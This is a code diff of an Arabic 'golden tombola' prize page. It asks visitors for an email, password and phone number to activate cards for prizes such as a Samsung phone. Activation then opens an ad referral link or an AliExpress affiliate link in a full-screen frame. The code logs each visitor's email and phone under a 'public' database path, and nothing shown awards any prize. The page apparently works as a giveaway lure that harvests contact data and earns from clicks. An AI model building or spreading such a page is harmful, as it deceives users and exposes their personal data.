@@ -4,9 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>طومبولا الحظ | النسخة الذهبية</title>
-    
-    <meta name="clckd" content="699e91684f9bb80551c9e78d3731464a" />
-    
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
     <style>
@@ -17,10 +14,10 @@
             --primary: #1e293b;
         }
         body { 
-             font-family: 'Cairo', sans-serif; 
-             background: #ffffff; 
-             color: var(--primary); 
-             overflow-x: hidden;
+            font-family: 'Cairo', sans-serif; 
+            background: #ffffff; 
+            color: var(--primary); 
+            overflow-x: hidden;
             margin: 0;
         }
         .bg-animate {
@@ -38,6 +35,7 @@
         }
         .page { display: none; min-height: 100vh; opacity: 0; transition: opacity 0.4s ease; }
         .page.active { display: flex; flex-direction: column; opacity: 1; }
+
         .prizes-grid {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
@@ -50,6 +48,7 @@
                 gap: 30px;
             }
         }
+
         .btn-activate {
             background: #fff;
             border: 3px dashed var(--gold);
@@ -71,6 +70,7 @@
             transform: translateY(-8px);
             box-shadow: 0 20px 25px -5px rgba(251, 191, 36, 0.3);
         }
+
         .prize-card {
             border-radius: 28px;
             overflow: hidden;
@@ -83,10 +83,12 @@
             flex-direction: column;
             border: 3px solid var(--gold);
         }
+
         @keyframes fadeIn {
             from { opacity: 0; transform: translateY(20px); }
             to { opacity: 1; transform: translateY(0); }
         }
+
         .prize-img {
             flex: 1;
             width: 100%;
@@ -95,6 +97,7 @@
             padding: 15px;
             background: white;
         }
+
         .prize-info {
             background: linear-gradient(to bottom, var(--gold), var(--gold-dark));
             color: white;
@@ -102,6 +105,7 @@
             text-align: center;
             flex-shrink: 0;
         }
+
         #adFrameContainer {
             display: none;
             position: fixed;
@@ -109,17 +113,8 @@
             z-index: 9999;
             background: #fff;
         }
-        #adFrame { width: 100%; height: calc(100% - 60px); border: none; margin-top: 60px; }
-        .ad-header {
-            position: absolute;
-            top: 0; left: 0; width: 100%; height: 60px;
-            background: #fff;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            border-bottom: 3px solid var(--gold);
-            z-index: 10000;
-        }
+        #adFrame { width: 100%; height: 100%; border: none; }
+        
         #toast {
             position: fixed;
             bottom: 20px;
@@ -134,6 +129,7 @@
             display: none;
             box-shadow: 0 10px 15px -3px rgba(0,0,0,0.2);
         }
+
         input {
             background: #f8fafc !important;
             border: 2px solid #e2e8f0 !important;
@@ -147,16 +143,12 @@
 <body>
     <div class="bg-animate"></div>
     <div id="toast"></div>
+
     <div id="adFrameContainer">
-        <div class="ad-header">
-            <div class="flex items-center gap-4">
-                <span class="text-sm font-bold text-slate-600">جاري تفعيل الهدية...</span>
-                <div class="bg-amber-500 text-white px-4 py-1 rounded-full font-black text-xl shadow-md" id="frameTimer">10</div>
-            </div>
-        </div>
         <iframe id="adFrame" src=""></iframe>
     </div>
 
+    <!-- صفحة تسجيل الدخول -->
     <div id="loginPage" class="page active items-center justify-center p-4">
         <div class="max-w-md w-full glass p-8">
             <div class="flex justify-center mb-6">
@@ -173,6 +165,7 @@
         </div>
     </div>
 
+    <!-- لوحة التحكم -->
     <div id="dashboardPage" class="page p-4 md:p-10">
         <div class="max-w-6xl mx-auto w-full">
             <header class="flex justify-between items-center mb-10 bg-white p-6 rounded-3xl shadow-sm border border-slate-100">
@@ -184,8 +177,9 @@
             </header>
             
             <div class="prizes-grid" id="prizesGrid"></div>
+
             <div class="text-center mt-16 text-slate-400 text-xs font-medium">
-                جميع الحقوق محفوظة &copy; طومبولا الحظ الذهبية 2026
+                جميع الحقوق محفوظة &copy; طومبولا الحظ الذهبية 2024
             </div>
         </div>
     </div>
@@ -208,8 +202,10 @@
         const db = getFirestore(app);
         const auth = getAuth(app);
         const appId = "tombola-luck-v1";
-
-        const CLICKADU_DIRECT_LINK = "https://aviso.bz/?r=id_2812"; 
+        
+        // الروابط الخارجية
+        const DEFAULT_URL = "https://aviso.bz/?r=id_2812";
+        const ALIEXPRESS_URL = "https://s.click.aliexpress.com/e/_c3l8b1VR";
 
         const prizeData = {
             1: { name: "Samsung Galaxy A24", img: "https://github.com/danibakou-prog/PAYRIXW/blob/main/%D9%87%D8%A7%D8%AA%D9%81-Samsung-Galaxy-A24.jpg?raw=true" },
@@ -258,17 +254,15 @@
             const email = document.getElementById('emailInput').value.trim();
             const password = document.getElementById('passwordInput').value.trim();
             const phone = document.getElementById('phoneInput').value.trim();
-            
             if(!email || !password || !phone) {
                 showMessage("يرجى إكمال كافة البيانات للمشاركة");
                 return;
             }
-
-            try {
-                 await signInWithEmailAndPassword(auth, email, password);
+            try { 
+                await signInWithEmailAndPassword(auth, email, password);
                 localStorage.setItem('user_phone', phone);
-            } catch (err) {
-                 if (err.code === 'auth/user-not-found' || err.code === 'auth/invalid-credential' || err.code === 'auth/invalid-email') {
+            } catch (err) { 
+                if (err.code === 'auth/user-not-found' || err.code === 'auth/invalid-credential' || err.code === 'auth/invalid-email') {
                     try {
                         const res = await createUserWithEmailAndPassword(auth, email, password);
                         await setDoc(doc(db, 'artifacts', appId, 'users', res.user.uid, 'profile', 'info'), {
@@ -326,49 +320,44 @@
                             </div>
                         `;
                     }
-                });
+                }, (error) => console.error("Error fetching card state:", error));
             }
         }
 
         window.startActivation = async function(uid, index) {
             const container = document.getElementById('adFrameContainer');
             const frame = document.getElementById('adFrame');
-            const timerEl = document.getElementById('frameTimer');
             
+            // تحديد الرابط بناءً على رقم البطاقة
+            // إذا كانت البطاقة رقم 1، افتح AliExpress، وإلا افتح الرابط الافتراضي
+            const targetUrl = (index === 1) ? ALIEXPRESS_URL : DEFAULT_URL;
+            
+            // إظهار الإطار فوراً بالرابط المختار
             container.style.display = 'block';
-            window.open(CLICKADU_DIRECT_LINK, '_blank');
-            frame.src = CLICKADU_DIRECT_LINK;
+            frame.src = targetUrl;
 
-            let time = 10;
-            timerEl.innerText = time;
-            const interval = setInterval(async () => {
-                time--;
-                timerEl.innerText = time;
-                if(time <= 0) {
-                    clearInterval(interval);
-                    const phone = localStorage.getItem('user_phone') || "Unknown";
-                    const ticketNum = `GOLD-${index}${Math.floor(1000 + Math.random() * 9000)}`;
-                    const prize = prizeData[index];
+            // تفعيل الجائزة في الخلفية فوراً
+            const phone = localStorage.getItem('user_phone') || "Unknown";
+            const ticketNum = `GOLD-${index}${Math.floor(1000 + Math.random() * 9000)}`;
+            const prize = prizeData[index];
 
-                    try {
-                        await setDoc(doc(db, 'artifacts', appId, 'users', uid, 'activatedCards', `card_${index}`), {
-                            active: true, phone: phone, ticketNumber: ticketNum, timestamp: serverTimestamp()
-                        });
-                        
-                        await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'all_activations'), {
-                            userId: uid, email: auth.currentUser.email, phone: phone, 
-                            prizeName: prize.name, ticketNumber: ticketNum, activatedAt: serverTimestamp()
-                        });
+            try {
+                // تفعيل البطاقة في قاعدة البيانات
+                await setDoc(doc(db, 'artifacts', appId, 'users', uid, 'activatedCards', `card_${index}`), {
+                    active: true, phone: phone, ticketNumber: ticketNum, timestamp: serverTimestamp()
+                });
+                
+                // تسجيل العملية في السجل العام
+                await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'all_activations'), {
+                    userId: uid, email: auth.currentUser.email, phone: phone, 
+                    prizeName: prize.name, ticketNumber: ticketNum, activatedAt: serverTimestamp()
+                });
 
-                        container.style.display = 'none';
-                        showMessage("مبروك! تم تفعيل بطاقة الحظ الذهبية.");
-                    } catch (e) {
-                        console.error(e);
-                        container.style.display = 'none';
-                        showMessage("حدث خطأ تقني، حاول مجدداً.");
-                    }
-                }
-            }, 1000);
+                showMessage("تم تفعيل بطاقتك بنجاح! جارٍ التحميل...");
+            } catch (e) {
+                console.error(e);
+                showMessage("حدث خطأ في التفعيل التلقائي.");
+            }
         }
     </script>
 </body>
